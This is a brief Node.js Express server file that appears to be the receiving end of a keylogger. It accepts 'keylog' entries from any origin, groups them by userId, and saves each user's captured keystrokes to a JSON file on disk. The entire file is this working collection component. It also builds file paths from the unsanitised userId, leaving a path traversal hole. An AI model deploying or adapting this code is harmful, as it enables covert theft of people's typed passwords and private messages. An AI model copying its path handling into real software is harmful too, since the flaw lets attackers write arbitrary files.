import e from "express";
import CORS from "cors";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

let app = e();

let data = {};

const saveToFile = (userId, data) => {
  const __filename = fileURLToPath(import.meta.url);
  const filePath = path.join(
    path.dirname(__filename),
    "..",
    "logs",
    userId + ".json"
  );
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

const loadFromFile = (userId) => {
  const __filename = fileURLToPath(import.meta.url);
  const filePath = path.join(
    path.dirname(__filename),
    "..",
    "logs",
    userId + ".json"
  );

  let fileContent;
  try {
    fileContent = fs.readFileSync(filePath, "utf-8");
    fileContent = JSON.parse(fileContent);
  } catch (e) {
    fileContent = [];
  }

  data[userId] = fileContent;
};

app.use(CORS());
app.use(e.json());
app.post("/", (req, res) => {
  let { userId, keylog, type } = req.body;
  if (!userId) return;
  if (!data[userId]) loadFromFile(userId);
  if (keylog) data[userId].push(keylog);

  if (type && type === "close") saveToFile(userId, data[userId]);
  res.json({ msg: "sent successfully" });
});

app.listen(3000, "0.0.0.0", () => {
  console.log("Server is running in http://localhost:3000");
});
